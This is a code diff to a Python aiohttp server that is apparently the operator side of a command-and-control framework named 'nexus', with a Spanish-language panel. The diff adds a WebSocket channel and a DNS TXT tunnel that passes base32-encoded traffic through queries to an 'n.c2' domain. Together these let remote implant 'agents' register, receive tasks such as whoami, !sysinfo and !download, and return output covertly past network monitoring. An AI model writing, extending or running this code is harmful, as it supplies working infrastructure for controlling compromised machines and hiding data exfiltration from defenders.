@@ -1,10 +1,14 @@
 import asyncio
+import base64
 import json
 import logging
 import os
+import socket as _socket
+import struct
 import time
 import uuid
 
+import aiohttp
 from aiohttp import web
 
 from protocol import (
@@ -81,7 +85,7 @@ tr.selected td{background:#071a07;border-left:2px solid #00ff41}
     </div>
     <div class="task-form" id="task-form">
       <label>Agente: <span id="sel-id" style="color:#00ff41"></span></label>
-      <input id="cmd" type="text" placeholder="whoami / uname -a / ls -la ..."/>
+      <input id="cmd" type="text" placeholder="whoami | !sysinfo | !download <url> <dest> | !help"/>
       <button id="exec-btn" onclick="sendTask()">&#9654; EJECUTAR</button>
     </div>
   </div>
@@ -198,11 +202,13 @@ log = logging.getLogger("nexus.server")
 
 SERVER_KEY_FILE  = "server_key.bin"
 SERVER_PUB_FILE  = "server_pub.hex"
-SESSION_TTL      = 300          # seconds — evict idle sessions after 5 min
-TASK_QUEUE_MAX   = 100          # max pending tasks per agent
-MAX_RESULTS      = 500          # max stored results per agent (circular)
-MAX_OUTPUT_BYTES = 64 * 1024    # 64 KB — truncate stdout/stderr above this
+SESSION_TTL      = 300
+TASK_QUEUE_MAX   = 100
+MAX_RESULTS      = 500
+MAX_OUTPUT_BYTES = 64 * 1024
 OPERATOR_API_KEY = os.environ.get("NEXUS_API_KEY", "")
+DNS_PORT         = int(os.environ.get("NEXUS_DNS_PORT", "5354"))
+DNS_DOMAIN       = b"n\x02c2\x00"  # encoded "n.c2" label sequence
 
 # ---------------------------------------------------------------------------
 # Global state (safe: asyncio is single-threaded)
@@ -227,8 +233,9 @@ def _truncate(s: str) -> str:
 
 @web.middleware
 async def _operator_auth(request: web.Request, handler):
-    """Require X-Api-Key on all /agents/* routes when NEXUS_API_KEY is set."""
-    if OPERATOR_API_KEY and request.path != "/":
+    """Require X-Api-Key only on /agents/* (operator REST API) when NEXUS_API_KEY is set.
+    POST / and GET /ws are agent protocol routes — never auth-gated."""
+    if OPERATOR_API_KEY and request.path.startswith("/agents"):
         if request.headers.get("X-Api-Key", "") != OPERATOR_API_KEY:
             return web.json_response({"error": "unauthorized"}, status=401)
     return await handler(request)
@@ -522,6 +529,176 @@ async def handle_panel(request: web.Request) -> web.Response:
 
 
 # ---------------------------------------------------------------------------
+# WebSocket transport handler  (GET /ws)
+# ---------------------------------------------------------------------------
+
+async def handle_ws(request: web.Request) -> web.WebSocketResponse:
+    """WebSocket channel — persistent, real-time, no beacon delay."""
+    ws = web.WebSocketResponse()
+    await ws.prepare(request)
+    log.info("WS   new connection from %s", request.remote)
+
+    sid_hex = None
+    sess    = None
+
+    async for msg in ws:
+        if msg.type != aiohttp.WSMsgType.BINARY:
+            continue
+
+        data = msg.data
+        if not data:
+            continue
+
+        # First frame: wire = [sid_len 1B][sid bytes][frame]
+        sid_len = data[0]
+        sid_raw = data[1: 1 + sid_len].decode("ascii") if sid_len else ""
+        frame   = data[1 + sid_len:]
+
+        # ── Handshake (no session yet) ────────────────────────────────────────
+        if not sid_raw or sid_raw not in sessions:
+            if not frame or frame[0] != 0x01:   # must be HELLO
+                await ws.send_bytes(pack_clear(MSG_ERROR))
+                continue
+            try:
+                welcome, session_id, _, chacha, srv_nonce = \
+                    server_process_hello(frame, server_priv)
+            except Exception as exc:
+                log.error("WS HELLO error: %s", exc)
+                await ws.send_bytes(pack_clear(MSG_ERROR))
+                continue
+            sid_hex = session_id.hex()
+            sess = SessionState(session_id, chacha, srv_nonce)
+            sessions[sid_hex] = sess
+            log.info("WS   HELLO session=%.16s", sid_hex)
+            await ws.send_bytes(welcome)
+            continue
+
+        # ── Encrypted frame ───────────────────────────────────────────────────
+        sess = sessions[sid_raw]
+        sid_hex = sid_raw
+        try:
+            msg_type, payload = parse_frame(frame, sess.chacha)
+        except Exception:
+            await ws.send_bytes(pack_clear(MSG_ERROR))
+            continue
+
+        resp = await _dispatch_encrypted(msg_type, payload, sess, sid_hex)
+        await ws.send_bytes(resp.body)
+
+    log.info("WS   closed session=%.16s", sid_hex or "?")
+    return ws
+
+
+# ---------------------------------------------------------------------------
+# DNS TXT tunnel handler  (UDP port 5353)
+# ---------------------------------------------------------------------------
+
+def _dns_parse_query(data: bytes) -> tuple[bytes, bytes]:
+    """Return (txid, encoded_payload) from a DNS TXT query."""
+    txid = data[:2]
+    pos  = 12   # skip header
+    labels = []
+    while pos < len(data) and data[pos] != 0:
+        length = data[pos]; pos += 1
+        labels.append(data[pos: pos + length].decode("ascii", errors="ignore"))
+        pos += length
+
+    # Drop the apex labels ("n", "c2"), keep data labels
+    payload_labels = labels[:-2] if len(labels) > 2 else labels
+    encoded = "".join(payload_labels).upper()
+    padding = (8 - len(encoded) % 8) % 8
+    raw = base64.b32decode(encoded + "=" * padding)
+    return txid, raw
+
+
+def _dns_build_txt_response(txid: bytes, query: bytes, txt: bytes) -> bytes:
+    """Build a minimal DNS TXT response with txt as the record data."""
+    # Header
+    flags    = b"\x81\x80"   # QR=1 (response), OPCODE=0, AA=1, RD=1, RA=1
+    header   = txid + flags + b"\x00\x01\x00\x01\x00\x00\x00\x00"
+    # Copy question section from query (starts at byte 12)
+    question = query[12:]
+    # Answer RR: pointer to question name + TYPE TXT + CLASS IN + TTL 0
+    # Split into ≤255-byte TXT strings (DNS limit per string)
+    encoded  = base64.b32encode(txt).lower().rstrip(b"=")
+    rdata    = b"".join(bytes([min(len(encoded) - i, 255)]) + encoded[i: i + 255]
+                        for i in range(0, max(len(encoded), 1), 255))
+    answer   = (
+        b"\xc0\x0c"                         # name pointer → offset 12
+        + b"\x00\x10"                        # TYPE = TXT
+        + b"\x00\x01"                        # CLASS = IN
+        + b"\x00\x00\x00\x00"               # TTL = 0
+        + struct.pack("!H", len(rdata))      # RDLENGTH
+        + rdata
+    )
+    return header + question + answer
+
+
+class _DnsProtocol(asyncio.DatagramProtocol):
+    """Asyncio UDP protocol for the DNS TXT tunnel."""
+
+    def __init__(self):
+        self._transport = None
+
+    def connection_made(self, transport):
+        self._transport = transport
+        log.info("DNS  tunnel listening on UDP :%d", DNS_PORT)
+
+    def datagram_received(self, data: bytes, addr):
+        asyncio.create_task(self._handle(data, addr))
+
+    def error_received(self, exc):
+        log.error("DNS socket error: %s", exc)
+
+    async def _handle(self, data: bytes, addr):
+        try:
+            txid, raw = _dns_parse_query(data)
+        except Exception as exc:
+            log.warning("DNS parse error from %s: %s", addr, exc)
+            return
+
+        sid_len = raw[0]
+        sid_raw = raw[1: 1 + sid_len].decode("ascii", errors="ignore") if sid_len else ""
+        frame   = raw[1 + sid_len:]
+
+        if not sid_raw or sid_raw not in sessions:
+            if not frame or frame[0] != 0x01:
+                resp_bytes = pack_clear(MSG_ERROR)
+            else:
+                try:
+                    welcome, session_id, _, chacha, srv_nonce = \
+                        server_process_hello(frame, server_priv)
+                    sid_hex = session_id.hex()
+                    sessions[sid_hex] = SessionState(session_id, chacha, srv_nonce)
+                    log.info("DNS  HELLO session=%.16s from %s", sid_hex, addr)
+                    resp_bytes = welcome
+                except Exception as exc:
+                    log.error("DNS HELLO error: %s", exc)
+                    resp_bytes = pack_clear(MSG_ERROR)
+        else:
+            sess = sessions[sid_raw]
+            try:
+                msg_type, payload = parse_frame(frame, sess.chacha)
+                resp = await _dispatch_encrypted(msg_type, payload, sess, sid_raw)
+                resp_bytes = resp.body
+            except Exception as exc:
+                log.error("DNS dispatch error: %s", exc)
+                resp_bytes = pack_clear(MSG_ERROR)
+
+        dns_resp = _dns_build_txt_response(txid, data, resp_bytes)
+        log.info("DNS  → %d B | ← %d B from %s", len(frame), len(resp_bytes), addr)
+        self._transport.sendto(dns_resp, addr)
+
+
+async def _dns_server() -> None:
+    loop = asyncio.get_running_loop()
+    await loop.create_datagram_endpoint(
+        _DnsProtocol,
+        local_addr=("0.0.0.0", DNS_PORT),
+    )
+
+
+# ---------------------------------------------------------------------------
 # Background: offline monitor
 # ---------------------------------------------------------------------------
 
@@ -569,6 +746,7 @@ async def _on_startup(app: web.Application) -> None:
     log.info("server pub=%s", pub.hex())
     asyncio.create_task(_monitor_agents())
     asyncio.create_task(_cleanup_sessions())
+    asyncio.create_task(_dns_server())
 
 
 # ---------------------------------------------------------------------------
@@ -582,6 +760,7 @@ def build_app() -> web.Application:
     )
     app.router.add_get("/",                           handle_panel)
     app.router.add_post("/",                         handle_nexus)
+    app.router.add_get("/ws",                        handle_ws)
     app.router.add_get("/agents",                    api_list_agents)
     app.router.add_post("/agents/{agent_id}/task",   api_enqueue_task)
     app.router.add_get("/agents/{agent_id}/results", api_get_results)
